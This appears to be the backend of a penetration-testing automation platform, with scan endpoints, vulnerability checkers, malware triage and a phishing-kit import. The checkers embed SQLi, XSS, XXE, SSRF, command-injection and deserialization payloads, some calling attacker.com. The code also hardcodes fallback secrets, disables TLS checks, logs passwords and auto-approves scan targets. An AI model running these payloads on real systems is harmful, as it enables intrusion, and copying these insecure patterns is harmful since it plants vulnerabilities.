import os
import re
import subprocess
import logging
import nmap
import paramiko
import pdfkit
import shodan
import whois
import socket
import json
import pickle
import requests
import yaml
import hashlib
import hmac
import zipfile
import tarfile
import tempfile
import pyotp
import traceback
import platform
from flask import Blueprint

from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, request, jsonify, make_response, send_file
from flask_jwt_extended import (
    JWTManager, create_access_token, create_refresh_token,
    jwt_required, get_jwt_identity, get_jwt
)
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_cors import CORS
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError
from werkzeug.utils import secure_filename
from dotenv import load_dotenv
import pymysql
from pymysql.cursors import DictCursor
import dns.resolver
import OpenSSL

import lief
import pefile
from bs4 import BeautifulSoup
from cryptography.fernet import Fernet
from passlib.hash import nthash, lmhash
from scapy.all import sniff, IP, TCP, UDP, ICMP
from stix2 import MemoryStore, Filter
from pyattck import Attck
import threading
import uuid
import time
import select
from zphisher_service import (
    start_zphisher, get_status, stop_session, fetch_zphisher_templates,
    check_ngrok_available, check_ssh_available, is_windows,
    get_history, get_history_detail, export_session_log
)
from flask_socketio import SocketIO, emit

# Load environment variables
load_dotenv()

# Initialize Flask app
app = Flask(__name__)

print("STARTING APP.PY")

# --- GLOBAL REQUEST LOGGING ---
@app.before_request
def log_request_info():
    if request.content_type and request.content_type.startswith('multipart/form-data'):
        app.logger.info(f"Headers: {dict(request.headers)}")
        app.logger.info("Body: [multipart/form-data omitted]")
    else:
        app.logger.info(f"Headers: {dict(request.headers)}")
        app.logger.info(f"Body: {request.get_data()}")

@app.before_request
def fix_authorization_header():
    # Some browsers/clients send 'authorization' instead of 'Authorization'
    if 'authorization' in request.headers and 'Authorization' not in request.headers:
        request.headers = request.headers.copy()
        request.headers['Authorization'] = request.headers['authorization']

# Configuration
class Config:
    # Database
    MYSQL_HOST = os.getenv('MYSQL_HOST', 'localhost')
    MYSQL_USER = os.getenv('MYSQL_USER', 'cybersec_app')
    MYSQL_PASSWORD = os.getenv('MYSQL_PASSWORD', 'SecurePassword123!')
    MYSQL_DB = os.getenv('MYSQL_DB', 'cybersec_automation')
    MYSQL_PORT = int(os.getenv('MYSQL_PORT', 3306))
    
    # Security
    SECRET_KEY = os.getenv('SECRET_KEY', 'cybersec_automation tools_hamilton_improve')
    JWT_SECRET_KEY = os.getenv('JWT_SECRET_KEY', 'cybersec_automation tools_hamilton_improved')
    JWT_TOKEN_LOCATION = ['headers']  # Only accept JWT from headers for best compatibility
    JWT_HEADER_NAME = 'Authorization'
    JWT_HEADER_TYPE = 'Bearer'
    JWT_ACCESS_TOKEN_EXPIRES = timedelta(hours=1)
    JWT_REFRESH_TOKEN_EXPIRES = timedelta(days=7)
    JWT_COOKIE_SECURE = os.getenv('JWT_COOKIE_SECURE', 'true').lower() == 'true'
    JWT_COOKIE_CSRF_PROTECT = True
    JWT_CSRF_CHECK_FORM = True
    FERNET_KEY = os.getenv('FERNET_KEY', Fernet.generate_key().decode())
    
    # Tools
    HYDRA_PATH = os.getenv('HYDRA_PATH', '/usr/bin/hydra')
    HASHCAT_PATH = os.getenv('HASHCAT_PATH', '/usr/bin/hashcat')
    JOHN_PATH = os.getenv('JOHN_PATH', '/usr/bin/john')
    AIRCRACK_PATH = os.getenv('AIRCRACK_PATH', '/usr/bin/aircrack-ng')
    SUBFINDER_PATH = os.getenv('SUBFINDER_PATH', '/usr/bin/subfinder')
    SQLMAP_PATH = os.getenv('SQLMAP_PATH', '/usr/bin/sqlmap')
    NIKTO_PATH = os.getenv('NIKTO_PATH', '/usr/bin/nikto')
    METASPLOIT_PATH = os.getenv('METASPLOIT_PATH', '/usr/bin/msfconsole')
    GOBUSTER_PATH = os.getenv('GOBUSTER_PATH', '/usr/bin/gobuster')
    WPSCAN_PATH = os.getenv('WPSCAN_PATH', '/usr/bin/wpscan')
    SSLYZE_PATH = os.getenv('SSLYZE_PATH', '/usr/bin/sslyze')
    TESTSSL_PATH = os.getenv('TESTSSL_PATH', '/usr/bin/testssl.sh')
    
    # File Uploads
    UPLOAD_FOLDER = os.getenv('UPLOAD_FOLDER', '/tmp/uploads')
    MAX_CONTENT_LENGTH = 16 * 1024 * 1024  # 16MB
    MALWARE_ANALYSIS_FOLDER = os.getenv('MALWARE_ANALYSIS_FOLDER', '/tmp/malware')
    
    # Rate Limiting
    RATE_LIMIT = os.getenv('RATE_LIMIT', '100 per minute')
    
    # Network Monitoring
    PCAP_FOLDER = os.getenv('PCAP_FOLDER', '/tmp/pcaps')
    SNIFF_TIMEOUT = int(os.getenv('SNIFF_TIMEOUT', 60))
    
    # Threat Intelligence
    MISP_URL = os.getenv('MISP_URL', 'https://misp.example.com')
    MISP_KEY = os.getenv('MISP_KEY', 'your-misp-key')
    VIRUSTOTAL_API_KEY = os.getenv('VIRUSTOTAL_API_KEY', 'your-virustotal-key')
    ALIENVAULT_OTX_KEY = os.getenv('ALIENVAULT_OTX_KEY', 'your-otx-key')

app.config.from_object(Config)

# Ensure directories exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['MALWARE_ANALYSIS_FOLDER'], exist_ok=True)
os.makedirs(app.config['PCAP_FOLDER'], exist_ok=True)

# Initialize MITRE ATT&CK framework
attack = Attck()

# Database Connection (simple function-based)
def get_db_connection():
    return pymysql.connect(
        host=app.config['MYSQL_HOST'],
        user=app.config['MYSQL_USER'],
        password=app.config['MYSQL_PASSWORD'],
        db=app.config['MYSQL_DB'],
        port=app.config['MYSQL_PORT'],
        charset='utf8mb4',
        cursorclass=DictCursor,
        autocommit=True
    )

def execute_query(query, args=None, fetch_one=False):
    conn = get_db_connection()
    try:
        with conn.cursor() as cursor:
            cursor.execute(query, args or ())
            if query.strip().upper().startswith('SELECT'):
                return cursor.fetchone() if fetch_one else cursor.fetchall()
            return cursor.lastrowid
    except pymysql.Error as e:
        app.logger.error(f"Database error: {e}")
        raise
    finally:
        conn.commit()
        conn.close()

# Initialize extensions
jwt = JWTManager(app)
ph = PasswordHasher()
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=[app.config['RATE_LIMIT']]
)
CORS(
    app,
    supports_credentials=True,
    resources={r"/*": {"origins": "http://localhost:5173"}},
    allow_headers=["Content-Type", "Authorization"],
    expose_headers=["Content-Disposition"],
    methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"]
)
fernet = Fernet(app.config['FERNET_KEY'].encode())

# Security middleware
@app.after_request
def apply_security_headers(response):
    security_headers = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline' cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'",
        'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Feature-Policy': "geolocation 'none'; microphone 'none'; camera 'none'",
        'Permissions-Policy': "geolocation=(), microphone=(), camera=()"
    }
    
    for header, value in security_headers.items():
        response.headers[header] = value
        
    return response

# Helper functions

def map_to_mitre_attack(technique_names):
    """
    Given a list of MITRE technique names, return a list of dicts with technique_id and name from the mitre_techniques table.
    """
    results = []
    try:
        for name in technique_names:
            row = execute_query(
                "SELECT technique_id, name FROM mitre_techniques WHERE name = %s",
                (name,),
                fetch_one=True
            )
            if row:
                results.append(row)
    except Exception as e:
        app.logger.error(f"MITRE mapping error: {e}")
    return results


def monitor_network(interface='eth0', timeout=60):
    """
    Capture network packets on a given interface for a specified timeout (seconds).
    Returns a summary dict: protocol counts, top talkers, and a real sample_packets list for UI.
    """
    from scapy.all import sniff, IP, TCP, UDP, ICMP
    import collections
    results = {
        'total_packets': 0,
        'protocol_counts': {},
        'top_talkers': {},
        'errors': None,
        'raw_sample': [],
        'sample_packets': []
    }
    try:
        packets = sniff(iface=interface, timeout=timeout)
        results['total_packets'] = len(packets)
        proto_counter = collections.Counter()
        talker_counter = collections.Counter()
        raw_sample = []
        sample_packets = []
        for pkt in packets:
            src = None
            dst = None
            proto = None
            size = len(pkt)
            if IP in pkt:
                src = pkt[IP].src
                dst = pkt[IP].dst
                if TCP in pkt:
                    proto = 6
                elif UDP in pkt:
                    proto = 17
                elif ICMP in pkt:
                    proto = 1
                else:
                    proto = 0
            else:
                proto = 0
            proto_counter[str(proto)] += 1
            if src:
                talker_counter[src] += 1
            # Save a string summary for legacy/raw
            if len(raw_sample) < 10:
                raw_sample.append(pkt.summary())
            # Save real packet info for the UI
            if len(sample_packets) < 10:
                sample_packets.append({
                    'source': src or '',
                    'destination': dst or '',
                    'protocol': proto,
                    'size': size
                })
        results['protocol_counts'] = dict(proto_counter)
        results['top_talkers'] = dict(talker_counter.most_common(5))
        results['raw_sample'] = raw_sample
        results['sample_packets'] = sample_packets
    except Exception as e:
        results['errors'] = str(e)
        results['sample_packets'] = []
        results['raw_sample'] = []
    return results



@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.get_json(silent=True) or {}
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({"error": "Missing username or password"}), 400

    # Fetch user from DB
    user = execute_query(
        "SELECT * FROM users WHERE username = %s",
        (username,),
        fetch_one=True
    )
    if not user:
        return jsonify({"error": "Invalid credentials"}), 401

    # Verify password (assuming Argon2 or similar)
    try:
        ph.verify(user['password_hash'], password)
    except Exception:
        return jsonify({"error": "Invalid credentials"}), 401

    # Create JWT
    access_token = create_access_token(identity=str(user['user_id']), additional_claims={"role": user['role'], "username": user['username']})
    refresh_token = create_refresh_token(identity=str(user['user_id']))
    return jsonify({
        "access_token": access_token,
        "refresh_token": refresh_token,
        "user": {
            "user_id": user['user_id'],
            "username": user['username'],
            "role": user['role'],
            "is_admin": user['role'] == 'admin'
        }
    }), 200

@app.route('/api/auth/register', methods=['POST'])
def register():
    data = request.get_json(silent=True) or {}
    username = data.get('username')
    password = data.get('password')
    email = data.get('email')
    if not username or not password or not email:
        return jsonify({"error": "Missing username, email, or password"}), 400

    # Check if username or email already exists
    existing_user = execute_query(
        "SELECT * FROM users WHERE username = %s OR email = %s",
        (username, email),
        fetch_one=True
    )
    if existing_user:
        return jsonify({"error": "Username or email already exists"}), 409

    # Hash password
    password_hash = ph.hash(password)

    # Insert user
    user_id = execute_query(
        "INSERT INTO users (username, email, password_hash, role, created_at) VALUES (%s, %s, %s, %s, %s)",
        (username, email, password_hash, 'analyst', datetime.now())
    )

    # Create JWT
    access_token = create_access_token(identity=user_id, additional_claims={"role": 'analyst', "sub": user_id})
    refresh_token = create_refresh_token(identity=user_id)
    return jsonify({
        "access_token": access_token,
        "refresh_token": refresh_token,
        "user": {
            "user_id": user_id,
            "username": username,
            "role": 'analyst'
        }
    }), 201


@app.route('/api/tools/nmap/scan', methods=['POST'])
@jwt_required()
def nmap_scan():
    job_id = None
    try:
        current_user = get_jwt_identity()
        claims = get_jwt()
        data = request.get_json(silent=True) or {}

        target = data.get('target')
        scan_args = data.get('scan_args', '-sV -T4')
        if not target:
            return jsonify({"error": "Missing required field: target"}), 400

        # Look up or insert target (same logic as vulnerability_scan)
        target_data = execute_query(
            "SELECT * FROM targets WHERE target_value = %s",
            (target,),
            fetch_one=True
        )
        if not target_data:
            # Insert new target
            target_id = execute_query(
                "INSERT INTO targets (target_value, added_by, created_at, authorization_status) VALUES (%s, %s, %s, %s)",
                (target, current_user, datetime.now(), 'approved')
            )
        else:
            target_id = target_data['target_id']

        # Create job record
        job_id = execute_query(
            "INSERT INTO jobs (user_id, tool_id, target_id, parameters, status, created_at) VALUES (%s, %s, %s, %s, %s, %s)",
            (
                current_user,
                1,  # tool_id for nmap (adjust as needed)
                target_id,
                json.dumps({'scan_args': scan_args}),
                'running',
                datetime.now()
            )
        )

        # Run nmap scan
        nm = nmap.PortScanner()
        try:
            nm.scan(target, arguments=scan_args)
            scan_result = nm.csv()
        except Exception as e:
            execute_query(
                "UPDATE jobs SET status = 'failed', completed_at = %s WHERE job_id = %s",
                (datetime.now(), job_id)
            )
            app.logger.error(f"Nmap scan error: {e}")
            log_activity(current_user, 'nmap_scan_failed', 'job', job_id)
            return jsonify({"error": "Nmap scan failed", "details": str(e)}), 500

        # Store scan results (assume a results table with job_id, result_type, result_data)
        execute_query(
            """INSERT INTO results (job_id, tool_name, target, output, status, started_at, finished_at, error_message, extra)
               VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)""",
            (
                str(job_id),
                'Nmap Scanner',
                target,
                scan_result,
                'done',
                datetime.now().isoformat(),  # Set at the start of the scan
                datetime.now().isoformat(),  # When scan finishes
                None,            # No error
                json.dumps({'scan_args': scan_args})
            )
        )

        # Update job status
        execute_query(
            "UPDATE jobs SET status = 'completed', completed_at = %s WHERE job_id = %s",
            (datetime.now().isoformat(), job_id)
        )

        log_activity(current_user, 'nmap_scan', 'job', job_id)
        return jsonify({
            "message": "Nmap scan completed",
            "job_id": job_id,
            "nmap_result_csv": scan_result
        }), 200

    except pymysql.err.OperationalError as e:
        if job_id is not None:
            execute_query(
                "UPDATE jobs SET status = 'failed' WHERE job_id = %s",
                (job_id,)
            )
        app.logger.error(f"Nmap scan DB error: {e}")
        return jsonify({"error": "Database operation failed", "details": str(e)}), 500
    except Exception as e:
        if job_id is not None:
            execute_query(
                "UPDATE jobs SET status = 'failed' WHERE job_id = %s",
                (job_id,)
            )
        app.logger.error(f"Nmap scan error: {e}")
        return jsonify({"error": "Nmap scan failed"}), 500

def validate_target(target):
    """Check if target exists and is authorized. Admins bypass authorization."""
    from flask_jwt_extended import get_jwt, verify_jwt_in_request
    try:
        verify_jwt_in_request(optional=True)
        claims = get_jwt()
        if claims and claims.get('role') == 'admin':
            # Admins can use any target, even if not approved
            return True  # Always allow for admin
    except Exception:
        pass
    # Non-admins: must be approved
    target_data = execute_query(
        "SELECT * FROM targets WHERE target_value = %s AND authorization_status = 'approved'",
        (target,),
        fetch_one=True
    )
    if not target_data:
        return None
    return target_data

def log_activity(user_id, action, entity_type=None, entity_id=None):
    """Log user activity for auditing"""
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    execute_query(
        """INSERT INTO audit_logs (user_id, action, entity_type, entity_id, ip_address, user_agent)
           VALUES (%s, %s, %s, %s, %s, %s)""",
        (user_id, action, entity_type, entity_id, ip, user_agent)
    )

def generate_report(job_id, report_type='technical'):
    """Generate PDF report for a job"""
    job = execute_query(
        "SELECT * FROM jobs WHERE job_id = %s",
        (job_id,),
        fetch_one=True
    )
    
    if not job:
        return None
    
    # Get tool name
    tool = execute_query(
        "SELECT name FROM tools WHERE tool_id = %s",
        (job['tool_id'],),
        fetch_one=True
    )
    
    # Get target
    target = execute_query(
        "SELECT target_value FROM targets WHERE target_id = %s",
        (job['target_id'],),
        fetch_one=True
    )
    
    # Get results
    results = execute_query(
        "SELECT * FROM job_results WHERE job_id = %s",
        (job_id,)
    )
    
    # Get vulnerabilities
    vulnerabilities = execute_query(
        "SELECT * FROM vulnerabilities WHERE job_id = %s",
        (job_id,)
    )
    
    # Get MITRE ATT&CK mappings
    mitre_mappings = execute_query(
        """SELECT t.name as technique_name, t.external_id as technique_id, 
                  t.url, t.description
           FROM mitre_techniques t
           JOIN job_mitre_mappings m ON t.technique_id = m.technique_id
           WHERE m.job_id = %s""",
        (job_id,)
    )
    
    # Generate HTML content
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Scan Report for Job #{job_id}</title>
        <style>
            body {{ font-family: Arial, sans-serif; line-height: 1.6; }}
            h1 {{ color: #2c3e50; }}
            h2 {{ color: #3498db; }}
            h3 {{ color: #7f8c8d; }}
            .finding {{ margin-bottom: 20px; padding: 10px; border: 1px solid #ccc; }}
            .critical {{ background-color: #ffcccc; }}
            .high {{ background-color: #ffddcc; }}
            .medium {{ background-color: #ffffcc; }}
            .low {{ background-color: #ccffcc; }}
            .info {{ background-color: #cceeff; }}
            pre {{ white-space: pre-wrap; word-wrap: break-word; }}
            table {{ border-collapse: collapse; width: 100%; }}
            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
            th {{ background-color: #f2f2f2; }}
        </style>
    </head>
    <body>
        <h1>Scan Report for Job #{job_id}</h1>
        <h2>Tool: {tool['name']}</h2>
        <h3>Target: {target['target_value']}</h3>
        <h3>Status: {job['status']}</h3>
        <h3>Started: {job['created_at']}</h3>
        <h3>Completed: {job['completed_at']}</h3>
        <hr>
        <h2>Findings</h2>
    """
    
    for result in results:
        severity_class = result['severity'].lower() if result['severity'] else 'info'
        html_content += f"""
        <div class="finding {severity_class}">
            <h4>{result['output_type'].upper()}: Severity {result['severity']}</h4>
            <pre>{result['content']}</pre>
        </div>
        """
    
    if vulnerabilities:
        html_content += "<h2>Vulnerabilities Found</h2>"
        for vuln in vulnerabilities:
            severity_class = vuln['severity'].lower() if vuln['severity'] else 'medium'
            html_content += f"""
            <div class="finding {severity_class}">
                <h4>{vuln['name']} (Severity: {vuln['severity']})</h4>
                <p>{vuln['description']}</p>
                <pre>Proof: {vuln['proof']}</pre>
            </div>
            """
    
    if mitre_mappings:
        html_content += "<h2>MITRE ATT&CK Mappings</h2>"
        html_content += "<table><tr><th>Technique ID</th><th>Name</th><th>Description</th></tr>"
        for technique in mitre_mappings:
            html_content += f"""
            <tr>
                <td><a href="{technique['url']}">{technique['technique_id']}</a></td>
                <td>{technique['technique_name']}</td>
                <td>{technique['description']}</td>
            </tr>
            """
        html_content += "</table>"
    
    html_content += """
        <hr>
        <p>Report generated at: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """</p>
    </body>
    </html>
    """
    
    # Save to temporary file
    report_path = f"/tmp/report_{job_id}.pdf"
    options = {
        'encoding': 'UTF-8',
        'quiet': '',
        'margin-top': '0.75in',
        'margin-right': '0.75in',
        'margin-bottom': '0.75in',
        'margin-left': '0.75in',
        'footer-center': 'Page [page] of [topage]'
    }
    
    try:
        pdfkit.from_string(html_content, report_path, options=options)
    except Exception as e:
        app.logger.error(f"PDF generation error: {e}")
        return None
    
    return report_path

def check_sqli_vulnerability(url):
    """Check for SQL injection vulnerabilities"""
    test_payloads = [
        "'",
        '"',
        "' OR '1'='1",
        '" OR "1"="1',
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin'#",
        "admin'/*",
        "' UNION SELECT null,username,password FROM users--",
        "' UNION SELECT null,table_name,null FROM information_schema.tables--"
    ]
    
    vulnerable = False
    proofs = []
    
    for payload in test_payloads:
        try:
            test_url = f"{url}?id={payload}"
            response = requests.get(test_url, timeout=7200, verify=False)
            
            # Check for common error patterns
            error_patterns = [
                "error in your SQL syntax",
                "warning: mysql",
                "unclosed quotation mark",
                "quoted string not properly terminated",
                "SQL syntax.*MySQL",
                "ORA-00933: SQL command not properly ended",
                "Microsoft OLE DB Provider for ODBC Drivers",
                "Microsoft SQL Native Client error",
                "PostgreSQL.*ERROR",
                "SQLite.Exception"
            ]
            
            if any(pattern.lower() in response.text.lower() for pattern in error_patterns):
                vulnerable = True
                proofs.append(f"Vulnerable to payload: {payload}")
                
            # Check for time-based blind SQLi
            time_payload = f"id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            start_time = datetime.now()
            requests.get(f"{url}?{time_payload}", timeout=7200, verify=False)
            elapsed = (datetime.now() - start_time).total_seconds()
            
            if elapsed >= 5:
                vulnerable = True
                proofs.append(f"Time-based blind SQLi detected with payload: {time_payload}")
                
        except Exception as e:
            app.logger.error(f"SQLi check error: {e}")
    
    return vulnerable, proofs

def check_xss_vulnerability(url):
    """Check for XSS vulnerabilities"""
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS');\">"
    ]
    
    vulnerable = False
    proofs = []
    
    for payload in xss_payloads:
        try:
            test_url = f"{url}?q={payload}"
            response = requests.get(test_url, timeout=7200, verify=False)
            
            # Check if payload is reflected unencoded
            if payload in response.text:
                vulnerable = True
                proofs.append(f"Reflected XSS with payload: {payload}")
                
            # Check for DOM XSS
            soup = BeautifulSoup(response.text, 'html.parser')
            scripts = soup.find_all('script')
            for script in scripts:
                if payload in script.text:
                    vulnerable = True
                    proofs.append(f"Potential DOM XSS in script: {script.text[:50]}...")
                    
        except Exception as e:
            app.logger.error(f"XSS check error: {e}")
    
    return vulnerable, proofs

def check_xxe_vulnerability(url):
    """Check for XXE vulnerabilities"""
    xxe_payloads = [
        """<?xml version="1.0"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <user><username>&xxe;</username></user>""",
        
        """<?xml version="1.0"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
        <user><username>&xxe;</username></user>""",
        
        """<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
        %xxe;
        ]>
        <user><username>test</username></user>"""
    ]
    
    vulnerable = False
    proofs = []
    
    for payload in xxe_payloads:
        try:
            headers = {'Content-Type': 'application/xml'}
            response = requests.post(url, data=payload, headers=headers, timeout=7200, verify=False)
            
            if "root:" in response.text or "uid=" in response.text:
                vulnerable = True
                proofs.append("System file content or command output leaked")
                
        except Exception as e:
            app.logger.error(f"XXE check error: {e}")
    
    return vulnerable, proofs

def check_insecure_deserialization(url):
    """Check for insecure deserialization"""
    class EvilPickle:
        def __reduce__(self):
            return (os.system, ('echo "RCE Test"',))
    
    class EvilYAML:
        def __init__(self):
            self.payload = "!!python/object/apply:os.system ['echo \"RCE Test\"']"
    
    vulnerable = False
    proofs = []
    
    # Test Python pickle
    try:
        payload = pickle.dumps(EvilPickle())
        response = requests.post(url, data=payload, timeout=7200, verify=False)
        if "RCE Test" in response.text:
            vulnerable = True
            proofs.append("Python pickle deserialization RCE")
    except Exception as e:
        app.logger.error(f"Pickle deserialization check error: {e}")
    
    # Test YAML
    try:
        payload = yaml.dump(EvilYAML().payload)
        response = requests.post(url, data=payload, headers={'Content-Type': 'application/yaml'}, timeout=7200, verify=False)
        if "RCE Test" in response.text:
            vulnerable = True
            proofs.append("YAML deserialization RCE")
    except Exception as e:
        app.logger.error(f"YAML deserialization check error: {e}")
    
    return vulnerable, proofs

def check_csrf_vulnerability(url):
    """Check for CSRF vulnerabilities"""
    try:
        # Check if anti-CSRF tokens are present
        response = requests.get(url, timeout=7200, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        forms = soup.find_all('form')
        vulnerable = True
        
        for form in forms:
            inputs = form.find_all('input')
            has_csrf_token = any(
                input.get('name', '').lower() in ['csrf', 'csrf_token', 'csrfmiddlewaretoken', '_token'] or
                input.get('type', '').lower() == 'hidden' and 'csrf' in input.get('value', '').lower()
                for input in inputs
            )
            
            if has_csrf_token:
                vulnerable = False
                break
                
        return vulnerable, ["No CSRF protection tokens found"] if vulnerable else []
        
    except Exception as e:
        app.logger.error(f"CSRF check error: {e}")
        return False, []

def check_idor_vulnerability(url, user_id):
    """Check for IDOR vulnerabilities"""
    try:
        # Test with different user IDs
        test_ids = [user_id, user_id + 1, user_id - 1]
        responses = []
        
        for test_id in test_ids:
            test_url = url.replace(str(user_id), str(test_id))
            response = requests.get(test_url, timeout=7200, verify=False)
            responses.append(response.status_code)
            
        # If we get 200 for different IDs, it's likely vulnerable
        if all(code == 200 for code in responses):
            return True, [f"Accessible with different IDs: {test_ids}"]
            
        return False, []
        
    except Exception as e:
        app.logger.error(f"IDOR check error: {e}")
        return False, []

def check_ssrf_vulnerability(url):
    """Check for SSRF vulnerabilities"""
    test_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/admin",
        "file:///etc/passwd"
    ]
    
    vulnerable = False
    proofs = []
    
    for payload in test_payloads:
        try:
            test_url = f"{url}?url={payload}"
            response = requests.get(test_url, timeout=7200, verify=False)
            
            if "AMI ID" in response.text or "root:" in response.text or "Admin Panel" in response.text:
                vulnerable = True
                proofs.append(f"SSRF detected with payload: {payload}")
                
        except Exception as e:
            app.logger.error(f"SSRF check error: {e}")
    
    return vulnerable, proofs

def check_file_inclusion(url):
    """Check for Local/Remote File Inclusion vulnerabilities"""
    test_payloads = [
        "../../../../etc/passwd",
        "http://attacker.com/shell.php",
        "php://filter/convert.base64-encode/resource=index.php"
    ]
    
    vulnerable = False
    proofs = []
    
    for payload in test_payloads:
        try:
            test_url = f"{url}?file={payload}"
            response = requests.get(test_url, timeout=7200, verify=False)
            
            if "root:" in response.text or "<?php" in response.text:
                vulnerable = True
                proofs.append(f"File inclusion detected with payload: {payload}")
                
        except Exception as e:
            app.logger.error(f"File inclusion check error: {e}")
    
    return vulnerable, proofs

def check_command_injection(url):
    """Check for Command Injection vulnerabilities"""
    test_payloads = [
        ";id",
        "|id",
        "`id`",
        "$(id)",
        "|| id",
        "&& id"
    ]
    
    vulnerable = False
    proofs = []
    
    for payload in test_payloads:
        try:
            test_url = f"{url}?cmd=ping{payload}"
            response = requests.get(test_url, timeout=7200, verify=False)
            
            if "uid=" in response.text and "gid=" in response.text:
                vulnerable = True
                proofs.append(f"Command injection detected with payload: {payload}")
                
        except Exception as e:
            app.logger.error(f"Command injection check error: {e}")
    
    return vulnerable, proofs

def check_cors_misconfig(url):
    """Check for CORS misconfigurations"""
    try:
        # Test with arbitrary Origin
        headers = {'Origin': 'https://attacker.com'}
        response = requests.get(url, headers=headers, timeout=7200, verify=False)
        
        cors_headers = response.headers.get('Access-Control-Allow-Origin', '')
        credentials = response.headers.get('Access-Control-Allow-Credentials', '')
        
        if cors_headers == '*' or (cors_headers == 'https://attacker.com' and credentials == 'true'):
            return True, [f"Insecure CORS configuration: {dict(response.headers)}"]
            
        return False, []
        
    except Exception as e:
        app.logger.error(f"CORS check error: {e}")
        return False, []

def check_jwt_issues(token):
    """Check for JWT security issues"""
    issues = []
    
    try:
        # Split token
        parts = token.split('.')
        if len(parts) != 3:
            return ["Invalid JWT format"]
            
        header = json.loads(base64url_decode(parts[0]))
        payload = json.loads(base64url_decode(parts[1]))
        
        # Check algorithm
        if header.get('alg') == 'none':
            issues.append("JWT accepts 'none' algorithm")
        elif header.get('alg') == 'HS256' and len(app.config['JWT_SECRET_KEY']) < 32:
            issues.append("Weak HMAC secret key")
            
        # Check expiration
        if 'exp' not in payload:
            issues.append("JWT has no expiration")
            
        # Check sensitive data
        sensitive_keys = ['password', 'secret', 'key', 'token']
        if any(key in payload for key in sensitive_keys):
            issues.append("JWT contains sensitive data")
            
        return issues
        
    except Exception as e:
        app.logger.error(f"JWT check error: {e}")
        return ["JWT validation error"]

def check_http_security_headers(url):
    """Check for missing security headers"""
    required_headers = [
        'Content-Security-Policy',
        'X-Content-Type-Options',
        'X-Frame-Options',
        'X-XSS-Protection',
        'Strict-Transport-Security',
        'Referrer-Policy'
    ]
    
    missing = []
    
    try:
        response = requests.get(url, timeout=7200, verify=False)
        
        for header in required_headers:
            if header not in response.headers:
                missing.append(header)
                
        return missing
        
    except Exception as e:
        app.logger.error(f"Security headers check error: {e}")
        return []

def analyze_malware(file_path):
    """Analyze uploaded malware sample"""
    analysis = {
        'file_info': {},
        'strings': [],
        'pe_analysis': {},
        'indicators': []
    }
    
    try:
        # Basic file info
        file_info = {
            'size': os.path.getsize(file_path),
            'type': 'unknown',  # magic.from_file removed
            'md5': hashlib.md5(open(file_path, 'rb').read()).hexdigest(),
            'sha1': hashlib.sha1(open(file_path, 'rb').read()).hexdigest(),
            'sha256': hashlib.sha256(open(file_path, 'rb').read()).hexdigest(),
            'ssdeep': 'not available',  # ssdeep.hash_from_file removed
        }
        analysis['file_info'] = file_info
        
        # Extract strings
        strings = subprocess.run(['strings', file_path], capture_output=True, text=True).stdout
        analysis['strings'] = strings.split('\n')[:1000]  # Limit to first 1000 strings
        
        # PE file analysis
        if file_info['type'].startswith('PE32'):
            try:
                pe = pefile.PE(file_path)
                pe_analysis = {
                    'entry_point': pe.OPTIONAL_HEADER.AddressOfEntryPoint,
                    'sections': [],
                    'imports': [],
                    'exports': [],
                    'suspicious': []
                }
                
                for section in pe.sections:
                    pe_analysis['sections'].append({
                        'name': section.Name.decode().strip('\x00'),
                        'virtual_address': hex(section.VirtualAddress),
                        'virtual_size': hex(section.Misc_VirtualSize),
                        'raw_size': hex(section.SizeOfRawData),
                        'characteristics': hex(section.Characteristics)
                    })
                
                if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
                    for entry in pe.DIRECTORY_ENTRY_IMPORT:
                        pe_analysis['imports'].append({
                            'dll': entry.dll.decode(),
                            'functions': [func.name.decode() if func.name else str(func.ordinal) for func in entry.imports]
                        })
                
                if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
                    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                        if exp.name:
                            pe_analysis['exports'].append(exp.name.decode())
                
                # Check for suspicious characteristics
                if any(section.Characteristics & 0x20000000 for section in pe.sections):  # EXECUTE
                    pe_analysis['suspicious'].append("Section with execute permission")
                if any(section.Characteristics & 0x80000000 for section in pe.sections):  # WRITE
                    pe_analysis['suspicious'].append("Section with write permission")
                
                analysis['pe_analysis'] = pe_analysis
            except Exception as e:
                app.logger.error(f"PE analysis error: {e}")
        
        # Check for known IOCs
        suspicious_strings = ['http://', 'https://', '.dll', '.exe', 'CreateProcess', 'WinExec', 'ShellExecute']
        analysis['indicators'] = [s for s in analysis['strings'] if any(ioc in s for ioc in suspicious_strings)]
        
        return analysis
        
    except Exception as e:
        app.logger.error(f"Malware analysis error: {e}")
